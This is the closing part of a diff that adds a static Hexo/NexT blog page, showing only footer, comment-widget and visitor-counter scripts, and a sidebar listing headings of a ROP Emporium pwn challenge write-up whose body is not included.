+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81MDAwMC8yNjQ5MQ=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Rop-Emporium"><span class="nav-number">1.</span> <span class="nav-text">Rop   Emporium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2win-32"><span class="nav-number">1.1.</span> <span class="nav-text">ret2win_32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2win-64"><span class="nav-number">1.2.</span> <span class="nav-text">ret2win_64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#split-32"><span class="nav-number">1.3.</span> <span class="nav-text">split_32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#split-64"><span class="nav-number">1.4.</span> <span class="nav-text">split_64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callme-32"><span class="nav-number">1.5.</span> <span class="nav-text">callme_32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callme-64"><span class="nav-number">1.6.</span> <span class="nav-text">callme_64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#write4-32"><span class="nav-number">1.7.</span> <span class="nav-text">write4_32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#write4-64"><span class="nav-number">1.8.</span> <span class="nav-text">write4_64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#badchars-32"><span class="nav-number">1.9.</span> <span class="nav-text">badchars_32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#badchars-64"><span class="nav-number">1.10.</span> <span class="nav-text">badchars_64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fluff-32"><span class="nav-number">1.11.</span> <span class="nav-text">fluff_32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fluff-64"><span class="nav-number">1.12.</span> <span class="nav-text">fluff_64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pivot-32"><span class="nav-number">1.13.</span> <span class="nav-text">pivot_32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pivot-64"><span class="nav-number">1.14.</span> <span class="nav-text">pivot_64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2csu-64"><span class="nav-number">1.15.</span> <span class="nav-text">ret2csu_64</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="L0ne1y"
+      src="/images/2.JPG">
+  <p class="site-author-name" itemprop="name">L0ne1y</p>
+  <div class="site-description" itemprop="description">老年pwn选手，在线养老</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/L0ne1y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0ne1y" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1532990032@qq.com" title="E-Mail → mailto:1532990032@qq.com" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0ne1y</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">28k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">25 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
